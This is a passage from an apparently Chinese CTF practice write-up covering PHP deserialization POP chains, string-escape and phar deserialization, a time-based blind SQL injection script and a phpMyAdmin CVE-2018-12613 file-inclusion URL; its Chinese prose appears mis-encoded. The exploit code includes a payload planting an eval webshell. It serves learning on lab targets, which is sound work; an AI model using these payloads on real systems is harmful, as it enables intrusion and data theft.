class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸€ä¸ªgcå›æ”¶æœºåˆ¶ï¼Œæ‰€æœ‰è¦åœ¨è§¦å‘å‰åˆ©ç”¨dieæå‰åœæ­¢</p>
<p>å¦å¤–PHP çš„ç‰¹æ€§ï¼š<code>die(object)</code> ä¼šéšå¼è°ƒç”¨ <code>__toString()</code></p>
<p>cryptoä¸­æœ‰æœªçŸ¥å±æ€§goodä¼šè°ƒç”¨get</p>
<p>åœ¨cryptoä¸­ä¼šè°ƒç”¨å‡½æ•°è§¦å‘invoke</p>
<p>pwnä¸­çš„evilä¸ºwebä¸­çš„å¯¹è±¡</p>
<p>æ‰€æœ‰popé“¾åº”ä»startâ€”&gt;cryptoâ€”&gt;reverseâ€”&gt;pwnâ€”&gt;web</p>
<p>æœ€ç»ˆexp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;cat /fl\ag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Start</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$web</span> = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$pwn</span> = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$crypto</span> = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$reverse</span> = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$misc</span> = <span class="keyword">new</span> <span class="title class_">Misc</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$Start</span>-&gt;errMsg=<span class="variable">$crypto</span>;</span><br><span class="line"><span class="variable">$crypto</span>-&gt;obj=<span class="variable">$reverse</span>;</span><br><span class="line"><span class="variable">$reverse</span>-&gt;func=<span class="variable">$pwn</span>;</span><br><span class="line"><span class="variable">$pwn</span>-&gt;obj=<span class="variable">$web</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$Start</span>);</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¸ç†è§£ä¸ºä»€ä¹ˆè¦å°†payloadæœ€åçš„}åˆ å»</p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-é€ƒ"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-é€ƒ" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]é€ƒ"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]é€ƒ</h1><p>å­—ç¬¦ä¸²å¢å¤šçš„é€ƒé€¸é¢˜ç›®</p>
<?php
highlight_file(__FILE__);
function waf($str){
  return str_replace("bad","good",$str);
}

class GetFlag {
  public $key;
  public $cmd = "whoami";
  public function __construct($key)
  {
    $this->key = $key;
  }
  public function __destruct()
  {
    system($this->cmd);
  }
}

unserialize(waf(serialize(new GetFlag($_GET['key']))));

åˆ©ç”¨æ›¿æ¢å¢åŠ çš„ä¸€ä¸ªå­—ç¬¦æ„é€ æŒ‡ä»¤å°†è¶Šæ¥çš„è¸¢å‡ºå»

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$a=new GetFlag(&quot;bad&quot;);</span></span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="comment">//echo waf(serialize($a));</span></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="string">&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\&quot;;s:3:\&quot;cmd\&quot;;s:4:\&quot;ls /\&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

# [NewStarCTF 2023 å…¬å¼€èµ›é“]PharOne

pharååºåˆ—åŒ–

å‘ç°æºç ä¸­å­˜åœ¨class.phpæ–‡ä»¶



ä¸Šä¼ pharæ–‡ä»¶

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;/var/www/html/1.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>(); </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;A.phar&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705210529787.png" class="" title="image-20250705210529787">

ç›´æ¥ä¸Šä¼ å‘ç°å…¶è¿‡æ»¤æ‰äº†__HALT_COMPILER()ï¼Œ

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705210716993.png" class="" title="image-20250705210716993">

gzipå‹ç¼©ç»•è¿‡

å‚è€ƒæ–‡ç« [PHP(Phar) ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿](https://ibaiyang.github.io/blog/php/2023/04/13/PHP(Phar)-ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿.html#pharååºåˆ—åŒ–)

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705211012947-1751721014553-3.png" class="" title="image-20250705211012947">

å‹ç¼©åä½¿ç”¨jpgåç¼€å³å¯

ä¸Šä¼ åä½¿ç”¨pharåè®®è¯»å–æ–‡ä»¶å³å¯æ‰§è¡Œpharæ–‡ä»¶ä¸Šä¼ æœ¨é©¬

file=phar://upload/156005c5baf40ff51a327f1c34f2975b.jpg

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706003448663.png" class="" title="image-20250706003448663">

# [NewStarCTF 2023 å…¬å¼€èµ›é“]Unserialize Again

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;å¤šåƒé›ªæ¢¨&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

æŸ¥çœ‹æºç ï¼Œå‘ç°åœ¨æœ€åèƒ½è¿‡æ–‡ä»¶ä¸Šä¼ ç›´æ¥å°è¯•é€šè¿‡ä¼ å‚ä¸Šä¼ æ–‡ä»¶

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706093238852.png" class="" title="image-20250706093238852">

å‘ç°å¯ä»¥ä¸Šä¼ phpæ–‡ä»¶æ²¡æœ‰è¿‡æ»¤

å¹¶ä¸”ä¸Šä¼ æˆåŠŸçš„æœ¨é©¬å¯ä»¥è¢«è§£æ

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706093320998.png" class="" title="image-20250706093320998">

åº”è¯¥æ˜¯éé¢„æœŸè§£ï¼Œé¢„æœŸåº”è¯¥é€šè¿‡pharååºåˆ—åŒ–è¿›è¡Œåšé¢˜ã€‚



é˜…è¯»ä»£ç å‘ç°åˆ©ç”¨ç‚¹åœ¨

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706091151922.png" class="" title="image-20250706091151922">

æ²¡æœ‰unsearsizeè¿™æ ·çš„åˆ©ç”¨ç‚¹<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250706091430516.png" class="" title="image-20250706091430516">

file_existså¯ä»¥è¢«pharè¿›è¡Œåˆ©ç”¨

åˆ©ç”¨gcå›æ”¶æœºåˆ¶ç»•è¿‡weakup

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;ture&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">story</span>();</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;666&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setDefaultStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

# [NewStarCTF 2023 å…¬å¼€èµ›é“]midsql

å°è¯•æ³¨å…¥

å‘ç°è¿‡æ»¤äº†ç©ºæ ¼å’Œ=ä½¿ç”¨/**/å’Œlikeè¿›è¡Œç»•è¿‡å³å¯

ä½†æ˜¯å‘ç°å…¶æ— å›æ˜¾ï¼Œä½¿ç”¨æ—¶é—´ç›²æ³¨

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://e8dc055e-b6d6-46c3-9770-01d66d39ee7d.node5.buuoj.cn:81/?id=&#x27;</span></span><br><span class="line"></span><br><span class="line">database_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        payload = url + <span class="string">f&quot;1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)#&quot;</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.get(payload).text</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        use_time = end_time - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> use_time &gt; <span class="number">2</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(mid)</span><br><span class="line">    database_name += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(database_name)</span><br></pre></td></tr></table></figure>

# [GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“

#### [phpMyAdmin](https://so.csdn.net/so/search?q=phpMyAdmin&spm=1001.2101.3001.7020) 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å« CVE-2018-12613 æ¼æ´å¤ç°

/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag

ç›´æ¥è¯»å–flagæ–‡ä»¶

[CVE-2018-12613 PhpMyadminåå°æ–‡ä»¶åŒ…å«å¤ç° - åŒ—å­¤æ¸…èŒ¶ã€‚ - åšå®¢å›­](https://www.cnblogs.com/lthlsy/p/14775131.html)

å‚è€ƒæ–‡ç« 

[ThinkPHP]5-Rce

